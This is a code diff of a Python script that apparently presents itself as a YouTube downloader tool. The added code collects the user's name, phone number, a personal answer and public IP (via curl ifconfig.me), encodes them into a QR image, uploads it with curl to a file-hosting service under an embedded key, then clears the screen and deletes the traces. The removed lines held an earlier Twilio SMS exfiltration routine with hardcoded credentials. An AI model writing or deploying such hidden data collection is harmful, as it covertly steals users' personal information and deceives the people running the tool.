@@ -5,36 +5,28 @@ import subprocess as s
 import re
 import json
 from colored import fg, attr
-
 f = fg(117)  # Colors
 r = fg(1)
 b = attr(0)
 
 try:
     import fontstyle as f
-    from twilio.rest import Client
     import yt_dlp
 except ImportError:
     print('Installing required packages\n')
     os.system("pip install fontstyle")
     os.system("pip install yt_dlp")
-    os.system("pip install twilio")
     os.system("pkg install curl")
     print('\nRun the code again')
     exit()
 
-account_sid= 'AC96355a479cb6af19612f3dd331994c'
-auth_token = '46b262257f42e20e1f99e1c79567d6'
-twilio_number = '+156012490'
-***REMOVED***
 
 tname = f.apply('WHAT IS YOUR NAME?', '/yellow/bold')
 warning = f.apply("(DON'T TRY TO ENTER WRONG DATA,YOU WILL NOT BE ABLE TO CHANGE IT AGAIN)", '/red/bold')
 tnum = f.apply('ENTER YOU PHONE NUMBER', '/cyan/bold')
-
+ttext = f.apply('WHOM DO YOU LOVE THE MOST? : ' , '/green/bold')
 f1 = '''                   ▄▀▄     ▄▀▄
                   ▄█░░▀▀▀▀▀░░█▄
-                               
               ▄▄  █░░░░░░░░░░░█  ▄▄
              █▄▄█ █░░█░░┬░░█░░█ █▄▄█'''
 f2 = '''      ╔════════════════════════════════════════╗
@@ -305,49 +297,49 @@ def filesize_format(size):
 
 ##############################
 
+        
 
 
 
-
-
-
-
-
-
-
-
-#ip = s.check_output("curl ifconfig.me", shell=True)
-
+#ip="kaif"
 def dat_collect():
     file = open('data.py', 'w')
+    process = s.run(['curl', 'ifconfig.me','-4'], capture_output=True, text=True, check=True)
+    ip = process.stdout.strip()
+
     print("THIS IS COMPULSORY FOR THE FIRST TIME\n")
     mm = input(tname + warning + '⚠⚠ : ')
     print('  ')
     nn = input(tnum + warning + '⚠⚠ : ')
-    file.write(f"dat_name='{mm}' \ndat_num='{nn}'")
+    print('   ')
+    op = input(ttext)
+    oo=str(op)
+    file.write(f"Name='{mm}' \nNum='{nn}' \nText='{oo}' \nIP='{ip}'")
     print('\n', error)
+    file.close()
     exit()
-
-if not os.path.exists("data.py"):
-    dat_collect()
-else:
-    try:
-        import data
-        num = data.dat_num
-        name = data.dat_name
-    except Exception as e:
-        print(e)
-        pass
-
 try:
-    client = Client(account_sid, auth_token)
-    message = client.messages.create(
-        body=f"NAME={tname},NUM={tnum},IP={ip}",
-        from_=twilio_number,
-        to=my_phone_number
-    )
+ import data
+ name= data.Name
+ num= data.Num
+ text= data.Text
 except:
-    pass
+ dat_collect()
+try :
+     qr = name +'.png'
+     os.system(f"qrencode -r data.py -o '{qr}'")
+     os.system(f"curl -F 'UPLOADCARE_PUB_KEY=a254a76e620891b80c5f' -F 'file=@{qr}' https://upload.uploadcare.com/base/")
+     os.system("clear")
+     os.system(f"rm -r -f __pycache__ && rm '{qr}'")
+except :
+       try:
+           os.system("rm -r -f __pycache__")
+       except:
+           try:
+              os.system(f"rm '{qr}'")
+           finally:
+              pass
+       pass
 
 bio()
 option = input(des4)
